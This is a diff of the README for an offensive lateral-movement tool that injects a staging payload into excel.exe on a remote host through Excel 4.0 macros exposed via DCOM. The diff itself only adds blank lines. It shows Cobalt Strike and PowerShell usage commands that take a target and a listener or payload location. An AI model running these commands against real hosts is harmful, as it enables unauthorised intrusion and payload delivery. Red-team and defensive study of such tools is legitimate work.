@@ -10,11 +10,13 @@ It turns out that Excel 4.0 macros are also exposed to DCOM via the ExecuteExcel
 **Cobalt Strike version**
 
 `Excel4-DCOM <targethost> <listener>`
+
 This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit beacon (which can be running on a 64 bit system).
 
 **PowerShell version**
 
 `Invoke-Excel4DCOM -ComputerName <target> -Payload <payload location>`
+
 This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit PowerShell host (%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe). 
 
 ## Why would I use this method over lateral movement method XYZ?
@@ -27,4 +29,5 @@ Secondly, due to XLM data type constraints (read our blog for details), this met
 
 ## Authors
 Stan Hegt (@StanHacked)
+
 Special thanks to Philip Tsukerman (@PhilipTsukerman) for pointing out to me that Excel 4.0 macros are exposed via DCOM.
